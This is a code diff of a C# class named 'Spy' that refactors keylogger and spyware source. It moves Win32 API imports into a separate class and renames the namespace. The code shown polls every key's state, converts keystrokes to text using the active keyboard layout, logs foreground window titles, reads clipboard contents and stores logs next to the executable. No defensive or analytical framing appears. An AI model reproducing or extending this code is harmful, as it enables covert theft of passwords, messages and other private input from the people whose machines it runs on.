@@ -9,7 +9,7 @@ using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.CompilerServices;
 using Microsoft.VisualBasic.Devices;
 
-namespace ClassLibrary1
+namespace XV
 {
     /// 
     ///           class Kl
@@ -17,6 +17,7 @@ namespace ClassLibrary1
     /// 
     public class Spy
     {
+       
         private int LastWinHandle;
         private string LastWinTitle;
         private Keys lastKey;
@@ -35,38 +36,14 @@ namespace ClassLibrary1
             this.LogsPath = Application.ExecutablePath + ".tmp";
         }
 
-        [DllImport("user32.dll")]
-        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
-        [DllImport("user32.dll")]
-        private static extern bool GetKeyboardState(byte[] lpKeyState);
-        [DllImport("user32.dll")]
-        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
-        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);
-        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        private static extern int GetKeyboardLayout(int dwLayout);
-        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        private static extern short GetAsyncKeyState(int vKey);
-        [DllImport("user32.dll", SetLastError = true)]
-        static public extern IntPtr GetClipboardData(uint uFormat);
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern bool CloseClipboard();
-        [DllImport("kernel32.dll")]
-        static extern UIntPtr GlobalSize(IntPtr hMem);
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GlobalLock(IntPtr hMem);
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern bool OpenClipboard(IntPtr hWndNewOwner);
         private string WorkWinInfo()
         {
             string result;
             try
             {
-                IntPtr foregroundWindowIntPtr = Spy.GetForegroundWindow();
+                IntPtr foregroundWindowIntPtr = Nm.GetForegroundWindow();
                 int processId=0;
-                Spy.GetWindowThreadProcessId(foregroundWindowIntPtr, ref processId);
+                Nm.GetWindowThreadProcessId(foregroundWindowIntPtr, ref processId);
                 Process processById = Process.GetProcessById(processId);
                 if ((foregroundWindowIntPtr.ToInt32() == this.LastWinHandle & Operators.CompareString(this.LastWinTitle, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0)
                 {
@@ -123,18 +100,18 @@ namespace ClassLibrary1
                 StringBuilder stringBuilder = new StringBuilder();
                 byte[] lpKeyState = new byte[255];
                 string result;
-                if (!Spy.GetKeyboardState(lpKeyState))
+                if (!Nm.GetKeyboardState(lpKeyState))
                 {
                     result = "";
                     return result;
                 }
 
-                uint wScanCode = Spy.MapVirtualKey(VKCode, 0u);
-                IntPtr foregroundWindow = Spy.GetForegroundWindow();
+                uint wScanCode = Nm.MapVirtualKey(VKCode, 0u);
+                IntPtr foregroundWindow = Nm.GetForegroundWindow();
                 int num = 0;
-                int windowThreadProcessId = Spy.GetWindowThreadProcessId(foregroundWindow, ref num);
-                IntPtr dwhkl = (IntPtr)Spy.GetKeyboardLayout(windowThreadProcessId);
-                Spy.ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
+                int windowThreadProcessId = Nm.GetWindowThreadProcessId(foregroundWindow, ref num);
+                IntPtr dwhkl = (IntPtr)Nm.GetKeyboardLayout(windowThreadProcessId);
+                Nm.ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
                 result = stringBuilder.ToString();
                 return result;
             }
@@ -258,7 +235,7 @@ namespace ClassLibrary1
                         int num2 = 0;
                         do
                         {
-                            if (Spy.GetAsyncKeyState(num2) == -32767 )
+                            if (Nm.GetAsyncKeyState(num2) == -32767 )
                             {
                                 Keys k = (Keys)num2;
                                 string text = this.Fix(k);
@@ -318,24 +295,22 @@ namespace ClassLibrary1
             if (Handle == IntPtr.Zero) return "";
             try
             {
-
-          
-            OpenClipboard(Handle);
+                Nm.OpenClipboard(Handle);
 
             //Get pointer to clipboard data in the selected format
-            IntPtr cdp = GetClipboardData(GLIP_TEXT);
+            IntPtr cdp = Nm.GetClipboardData(GLIP_TEXT);
 
             //Do a bunch of crap necessary to copy the data from the memory
             //the above pointer points at to a place we can access it.
-            UIntPtr length = GlobalSize(cdp);
-            IntPtr gLock = GlobalLock(cdp);
+            UIntPtr length = Nm.GlobalSize(cdp);
+            IntPtr gLock = Nm.GlobalLock(cdp);
 
             //Init a buffer which will contain the clipboard data
             byte[] buffer = new byte[(int)length];
 
             //Copy clipboard data to buffer
             Marshal.Copy(gLock, buffer, 0, (int)length);
-            CloseClipboard();
+                Nm.CloseClipboard();
 
             return OK.GetString(buffer);
             }
